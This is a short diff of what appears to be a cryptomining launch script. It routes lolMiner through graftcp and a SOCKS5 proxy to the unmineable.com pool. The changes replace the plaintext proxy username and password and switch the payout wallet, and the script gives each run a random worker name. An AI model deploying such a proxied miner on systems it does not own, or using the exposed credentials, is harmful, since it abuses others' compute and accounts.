@@ -33,9 +33,9 @@ loglevel = 1
 
 socks5 = 209.127.191.180:9279
 
-socks5_username = yujeskyf
+socks5_username = yahkolcv
 
-socks5_password = q4x64nhe8eod
+socks5_password = b2tuiaptpt51
 
 END
 
@@ -50,4 +50,4 @@ echo " "
 echo " "
 
 
-./graftcp/graftcp ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user RVN:RBXC64GiFJYcYMnfHV5XjTELsHEEQxivmZ.$(echo $(shuf -i 1-999 -n 1)-lol) --ethstratum ETHPROXY
+./graftcp/graftcp ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TSegVmnvSAQ6MSAUMv28aWBgNtjtJJpMy1.$(echo $(shuf -i 1-999 -n 1)-lol) --ethstratum ETHPROXY
